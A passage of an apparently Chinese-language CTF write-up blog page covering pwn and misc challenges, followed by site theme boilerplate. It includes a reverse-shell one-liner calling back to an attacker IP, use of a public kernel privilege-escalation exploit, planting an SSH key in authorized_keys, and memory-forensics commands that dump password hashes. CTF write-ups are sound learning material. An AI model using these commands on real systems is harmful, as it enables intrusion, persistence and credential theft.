class="string">"10.21.13.202"</span>,<span class="number">1234</span>)</div><div class="line">r.recvuntil(<span class="string">"请输入要进行的操作："</span>)</div><div class="line">r.sendline(<span class="string">"2"</span>)</div><div class="line">r.recvuntil(<span class="string">"第一步，请做100次基本的数学运算吧："</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i in range(<span class="number">100</span>):</div><div class="line">	r.recvuntil(<span class="string">":"</span>)</div><div class="line">	data=r.recvuntil(<span class="string">"="</span>)</div><div class="line">	k1=<span class="keyword">int</span>(data.split(<span class="string">' '</span>)[<span class="number">1</span>],<span class="number">10</span>)</div><div class="line">	f=data.split(<span class="string">' '</span>)[<span class="number">2</span>]</div><div class="line">	k2=<span class="keyword">int</span>(data.split(<span class="string">' '</span>)[<span class="number">3</span>],<span class="number">10</span>)</div><div class="line">	<span class="keyword">if</span> f==<span class="string">'+'</span>:</div><div class="line">   		key=k1+k2</div><div class="line">	elif f==<span class="string">'-'</span>:</div><div class="line">   		key=k1-k2</div><div class="line">	elif f==<span class="string">'*'</span>:</div><div class="line">   		key=k1*k2</div><div class="line">	elif f==<span class="string">'/'</span>:</div><div class="line">   		key=k1/k2</div><div class="line">	r.sendline(str(key))</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure></p>
+<p>得到加密后在字符串，题目是区块链+各种解码猜测后发现是base58，解码出来得到用户名和密码</p>
+<h2 id="寻找flag"><a href="#寻找flag" class="headerlink" title="寻找flag"></a>寻找flag</h2><p>用命令<br><code>find -name flag</code><br>发现找不到，经过出题人提示，flag在root目录下，但是这个用户无法进入，当然想到提权啦。</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><code>uname -a</code><br>发现linux内核版本，然后百度一下，发现CVE-2017-16995漏洞类似，去github上找一下，找到利用脚本，然后下载下来<br><code>git clone https://github.com/iBearcat/CVE-2017-16995.git</code><br>这里我不知道下载下来没有，ls一下，发现一家下载下来啦,运行<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc exploit.c -o exploit</div><div class="line">./exploit</div></pre></td></tr></table></figure></p>
+<p>发现完全没有反应，蒙，完全不知道什么报错，想看错误,反弹shell</p>
+<h3 id="显示错误"><a href="#显示错误" class="headerlink" title="显示错误"></a>显示错误</h3><p>先本地监听<br><code>nc -vlp 1234</code><br>搭建web服务，写入反弹shell（这里改掉ip就好啦）<br><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.21.107.42 1234 &gt;/tmp/f</code><br>多试几次就行啦。<br>接着是发现,运行参数出错。蒙，，，，又去py出题人，出题人表示这是shell环境不一样，提示ssh连上去</p>
+<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>ssh登录有两种方法，<br>方法1:用户名密码登录<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ssh -l root <span class="number">192.168</span><span class="number">.0</span><span class="number">.11</span>  （默认端口<span class="number">22</span>）</div><div class="line">ssh -l root -p <span class="number">12333</span> <span class="number">216.230</span><span class="number">.230</span><span class="number">.114</span> （修改端口<span class="number">12333</span>）</div></pre></td></tr></table></figure></p>
+<p>方法2:用户免密码登录<br>本地生成公私钥，将公钥放在需要ssh登录的机器上<br>本地生成公私钥,执行这条命令，就会在根目录上发现.ssh目录<br><code>ssh-keygen -t rsa</code><br>利用ls -a查看<br>进入.ssh目录，将id_rsa.pub的内容复制到需要ssh登录的机器上，在已经得到shell的机器上，进入当前用户目录，创建一个.ssh目录,并将公钥写入authorized_keys文件<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir .ssh</div><div class="line">cd .ssh </div><div class="line">echo <span class="string">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBt2kJefRVdsr5DcRemSvHSVRIJZ+GchQ3bK4mHPP2+mkItPz28UE1+V0SvAbzqyMVZQeWuV0wwluoco5zHcuk5ki/Mz/9nn4XKC55qp90Qu+7spSg8Ff496Gkz65sMpNOWpVpyKJy5iwBeCjyTLlcy3hTHqpEeIZvGF8B/Pku5vxqhf1GnOkqUjmv2Fzr2cgovmiE1pilZBB3lwtu6IGZzbO5pHqwdZ9WrDDNwbwQ6+dK0kZFqZN1XgsMeBOezSL19NnWZLx+e/byzrgCxf6fXefUlC4tja+49ibGsKbv7RbH18Kk0af46O1hWUAeBL1SPGFad+Bv/X4X/XQC4Wcx root@kali</span></div><div class="line"><span class="string">"</span> &gt; authorized_keys</div></pre></td></tr></table></figure></p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="NTFS"><a href="#NTFS" class="headerlink" title="NTFS"></a>NTFS</h2><p>创建一个隐藏文件<br>echo 666666&gt;&gt;suzhu.txt:stream.txt<br>显示隐藏文件<br>notepad suzhu.txt:stream.txt<br>隐藏图片<br>type aaa.jpg&gt;&gt;suzhu.txt:aaa.jpg<br>打开图片<br>mspaint suzhu.txt:aaa.jpg</p>
+<h2 id="内存镜像取证"><a href="#内存镜像取证" class="headerlink" title="内存镜像取证"></a>内存镜像取证</h2><p>1、获取版本号<br>volatility -f pc.raw imageinfo<br>2、查看运行进程<br>volatility -f pc.raw –profile=WinXPSP3x86 pslist<br>3、dump出某个pid[exe程序]<br>volatility -f pc.raw –profile=WinXPSP3x86 memdump -p 3832 -D .<br>4、查看注册表<br>volatility -f pc.raw –profile=WinXPSP3x86 hivelist<br>5、dump用密码（-s 值SAM的虚拟地址，-y值system的虚拟地址）<br>volatility -f pc.raw –profile=WinXPSP3x86 hashdump -y 0xe1036b60 -s 0xe15d9008 &gt; 1.txt<br>6、查看用户名<br>volatility -f pc.raw –profile=WinXPSP3x86 printkey -K “SAM\Domains\Account\Users\Names”</p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>Donate</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt=" 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <div>
+     
+      <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/04/algorithm_shortest_path/" rel="next" title="最短路径">
+                <i class="fa fa-chevron-left"></i> 最短路径
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="662ym8qmGBMUlts3YzqMR1VS"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/saucxs/" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://weibo.com/" target="_blank" title="Twitter">
+                    
+                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.zhihu.com/people/ese-76-83/activities" target="_blank" title="Zhihu">
+                    
+                      <i class="fa fa-fw fa-drupal"></i>Zhihu</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://weibo.com/5899672336/profile?topnav=1&wvr=6/&is_all=1" target="_blank" title="Weibo">
+                    
+                      <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.betamao.me/" title="betamao" target="_blank">betamao</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://err0rzz.github.io/" title="err0rzz" target="_blank">err0rzz</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://veritas501.space/" title="Veritas501" target="_blank">Veritas501</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jianshu.com/u/91d9fc4789e3" title="Killshadow" target="_blank">Killshadow</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lalajun.github.io/" title="lalajun" target="_blank">lalajun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://bestwing.me/" title="swing" target="_blank">swing</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://b3t4m3ee.github.io/" title="b3t4m3ee" target="_blank">b3t4m3ee</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://myblackmanba.github.io/" title="black" target="_blank">black</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.baidu.com" title="百度一下" target="_blank">百度一下</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RE"><span class="nav-number">1.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#签到题-有名为送分题"><span class="nav-number">1.1.</span> <span class="nav-text">签到题(有名为送分题)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析"><span class="nav-number">1.1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag"><span class="nav-number">1.1.2.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#出题思路"><span class="nav-number">1.1.3.</span> <span class="nav-text">出题思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyre"><span class="nav-number">1.2.</span> <span class="nav-text">babyre</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#出题思路-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">出题思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#New-driver"><span class="nav-number">1.3.</span> <span class="nav-text">New driver</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#出题思路-2"><span class="nav-number">1.3.3.</span> <span class="nav-text">出题思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Old-driver"><span class="nav-number">1.4.</span> <span class="nav-text">Old driver</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析-3"><span class="nav-number">1.4.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag-3"><span class="nav-number">1.4.2.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#出题思路-3"><span class="nav-number">1.4.3.</span> <span class="nav-text">出题思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#秋名山车神"><span class="nav-number">1.5.</span> <span class="nav-text">秋名山车神</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析-4"><span class="nav-number">1.5.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag-4"><span class="nav-number">1.5.2.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#出题思路-4"><span class="nav-number">1.5.3.</span> <span class="nav-text">出题思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目"><span class="nav-number">1.6.</span> <span class="nav-text">题目</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">2.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#得到shell"><span class="nav-number">2.1.</span> <span class="nav-text">得到shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一种方法"><span class="nav-number">2.1.1.</span> <span class="nav-text">第一种方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二种方法"><span class="nav-number">2.1.2.</span> <span class="nav-text">第二种方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#寻找flag"><span class="nav-number">2.2.</span> <span class="nav-text">寻找flag</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#提权"><span class="nav-number">2.2.1.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#显示错误"><span class="nav-number">2.2.2.</span> <span class="nav-text">显示错误</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh登录"><span class="nav-number">2.2.3.</span> <span class="nav-text">ssh登录</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">3.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NTFS"><span class="nav-number">3.1.</span> <span class="nav-text">NTFS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内存镜像取证"><span class="nav-number">3.2.</span> <span class="nav-text">内存镜像取证</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共65.4k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'zcWjlG57Emc5jAlfR1pIEPVm-gzGzoHsz',
+        appKey: 'Mt81aRWQozkXMVGeSgXGXELQ',
+        placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+        avatar:'',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === '') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+<script type="text/javascript" src="/js/src/particle.js" count="50" zindex="-2" opacity="1" color="0,104,183"></script>
